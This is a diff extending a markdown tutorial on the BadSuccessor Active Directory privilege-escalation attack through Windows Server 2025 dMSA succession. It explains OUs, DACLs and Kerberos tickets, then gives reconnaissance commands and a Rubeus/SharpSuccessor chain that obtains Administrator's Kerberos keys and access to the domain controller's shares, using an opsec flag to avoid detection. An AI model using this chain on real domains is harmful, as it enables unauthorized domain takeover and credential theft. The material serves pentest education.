@@ -11,6 +11,50 @@ Services running on Windows (web servers, databases, scheduled tasks) need accou
 
 ---
 
+## Background: OUs, DACLs, and Kerberos Tickets
+
+Before diving into MSAs, three AD fundamentals that this attack depends on:
+
+### Organizational Units (OUs)
+
+OUs are **folders inside Active Directory** for organizing objects (users, computers, groups). Just like filesystem folders, they exist for two reasons:
+1. **Organization** — group objects logically (by department, location, role)
+2. **Delegation** — grant someone admin rights over just that folder, not the whole domain
+
+For example, an IT team might have `OU=HelpDesk` where helpdesk staff can create and manage user accounts, without giving them Domain Admin. The permissions on an OU are controlled by **DACLs**.
+
+### DACLs (Discretionary Access Control Lists)
+
+A DACL is a list of "who can do what" attached to every AD object. Each entry (called an ACE — Access Control Entry) says something like:
+- "User `tbyte` has `CreateChild` permission on `OU=LabOU`"
+- "Group `Domain Admins` has `GenericAll` on `OU=Servers`"
+
+Key permission types for this attack:
+- **CreateChild** — can create new objects inside this OU
+- **GenericAll** — full control over the object (read, write, delete, create children)
+- **WriteDACL** — can modify the permissions list itself (give yourself more access)
+- **WriteOwner** — can change the owner (owners implicitly have full control)
+
+Any of these on an OU is enough for BadSuccessor.
+
+### TGT vs TGS (Kerberos Tickets)
+
+Kerberos uses a two-ticket system. Think of it like a festival:
+
+**TGT (Ticket Granting Ticket)** = your **wristband**. You get it at the gate (by proving your identity to the KDC). It proves "I am who I say I am" but doesn't get you into any specific tent.
+
+**TGS (Ticket Granting Service ticket)** = a **ticket for a specific tent**. You show your wristband (TGT) at the ticket booth and say "I want to enter the CIFS tent on the DC." The booth gives you a TGS for that specific service.
+
+So the flow is: `Password → TGT → TGS → Access service`
+
+You never show your password again after getting the TGT. And you can get multiple TGS tickets from one TGT (access multiple services without re-authenticating).
+
+### The `$` Suffix Convention
+
+In AD, **machine accounts and service accounts** end with `$`. When you see `pentest_dmsa$`, the `$` tells you it's a machine/service account, not a regular user. This matters for Kerberos — tools like Impacket need the `$` to authenticate correctly.
+
+---
+
 ## The MSA Evolution
 
 ### sMSA (Standalone Managed Service Account)
@@ -30,6 +74,8 @@ Introduced in **Windows Server 2012**. Solves the multi-server problem — a sin
 Introduced in **Windows Server 2025**. The newest type. Designed to make migrating from old service accounts to managed ones easier. The key feature is **succession** — a dMSA can "take over" from an existing account, inheriting its permissions through Kerberos.
 
 The idea: instead of manually reconfiguring every service that uses the old account, just create a dMSA that "succeeds" it, and the dMSA gets the old account's Kerberos keys automatically.
+
+**Important:** Succession does NOT delete or disable the original account. It's like **duplicating a key** — the old account still exists, still has its password, still works. The dMSA just gets a copy of the Kerberos keys. Both accounts work simultaneously.
 
 **This succession mechanism is where BadSuccessor lives.**
 
@@ -61,6 +107,44 @@ The critical flaw: step 4 has **no authorization check**. The DC doesn't verify 
 
 ---
 
+## Reconnaissance
+
+Before exploiting, you need to find accounts that have CreateChild (or GenericAll/WriteDACL/WriteOwner) on an OU. Two approaches:
+
+### From Windows (PowerShell)
+
+Use `Get-BadSuccessorOUPermissions.ps1` or similar DACL enumeration scripts to find accounts with dangerous permissions on OUs:
+
+```powershell
+# Look for CreateChild, GenericAll, WriteDACL, WriteOwner on OUs
+Get-BadSuccessorOUPermissions
+```
+
+This reads the DACLs on every OU and reports which non-admin accounts have permissions that could be abused.
+
+### From Linux (netexec / bloodyAD)
+
+**LDAP signing matters here.** Modern DCs (especially Server 2025) enforce LDAP signing — the server requires all LDAP requests to be cryptographically signed. Tools like raw `ldapsearch` or `impacket-dacledit` will fail with `strongerAuthRequired`. 
+
+**netexec** (nxc) handles LDAP signing automatically:
+
+```bash
+# Enumerate DACL permissions on a specific OU
+nxc ldap DC_IP -u USER -p PASS -d domain.local \
+    -M daclread -o TARGET_DN="OU=SomeOU,DC=domain,DC=local" ACTION=read
+```
+
+**bloodyAD** also handles signing:
+
+```bash
+# Find all objects you can write to or create children in
+bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN get writable --detail
+```
+
+Look for output showing `CREATE_CHILD` on an OU — specifically `dSA: CREATE_CHILD`, which means you can create dMSA objects.
+
+---
+
 ## Exploitation
 
 ### From Windows (SharpSuccessor + Rubeus)
@@ -74,20 +158,36 @@ SharpSuccessor.exe -dc DC-HOSTNAME -domain domain.local \
     -target "CN=Administrator,CN=Users,DC=domain,DC=local"
 ```
 
-**Rubeus** handles the Kerberos side:
+**Rubeus** handles the Kerberos side in three steps:
+
+**Step 1 — Extract a TGT with `tgtdeleg`:**
 
 ```
-# Extract a TGT from the current session
 Rubeus.exe tgtdeleg
+```
 
-# Use the TGT to request a TGS as the dMSA (gets target's keys)
+The `tgtdeleg` trick is clever. You can't just read your own TGT from memory (it's encrypted with a key you don't have). Instead, Rubeus **fakes a Kerberos delegation request** — it tells the DC "I need to forward my TGT to another service." The DC responds with a copy of the TGT encrypted in a way Rubeus can read. It's a legitimate protocol feature being abused to extract something you're not supposed to access directly.
+
+**Step 2 — Request a TGS as the dMSA (gets the target's keys):**
+
+```
 Rubeus.exe asktgs /ticket:<TGT> /service:krbtgt/domain.local /targetuser:dmsa_name$ /opsec
+```
 
-# Use the extracted keys to get a CIFS service ticket for the DC
+- `/ticket:<TGT>` — present the TGT from step 1
+- `/service:krbtgt/domain.local` — request a TGS from the KDC
+- `/targetuser:dmsa_name$` — "I want to act as this dMSA"
+- `/opsec` — use encryption types that look normal (avoid detection)
+
+The DC processes this, sees the dMSA's succession link to Administrator, and includes Administrator's Kerberos keys (AES256, AES128, RC4) in the response.
+
+**Step 3 — Get a service ticket using the stolen keys:**
+
+```
 Rubeus.exe asktgs /ticket:<TGS> /service:cifs/DC-HOSTNAME.domain.local /enctype:aes256 /key:<AES256_KEY>
 ```
 
-After this, you can access the DC's file shares (or any other service) as Administrator.
+Now you're requesting a CIFS (file sharing) service ticket for the DC, authenticating with Administrator's AES256 key. The DC sees a valid key and issues the ticket. You can now access the DC's file shares — `\\DC\C$`, `\\DC\ADMIN$`, anything Administrator can reach.
 
 ### From Linux (bloodyAD + Impacket)
 
